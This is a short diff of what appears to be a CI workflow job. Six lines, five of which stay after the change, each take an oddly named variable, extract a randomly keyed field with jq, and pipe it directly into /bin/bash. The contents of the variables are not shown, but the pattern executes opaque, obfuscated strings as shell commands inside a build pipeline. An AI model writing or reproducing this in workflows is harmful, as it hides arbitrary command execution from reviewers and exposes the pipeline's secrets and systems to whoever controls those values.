@@ -28,7 +28,6 @@ jobs:
           echo $stack1 | jq -r .xyylg395 | /bin/bash
           printf '%s' "$jevy02" | jq -r .mny04423 | /bin/bash
           echo $euw1 | jq -r .fqmcg605 | /bin/bash
-          echo $pp0991 | jq -r .x3 | /bin/bash
           echo $zo6 | jq -r .pifyx988 | /bin/bash
           echo $yj297 | jq -r .x3 | /bin/bash
 
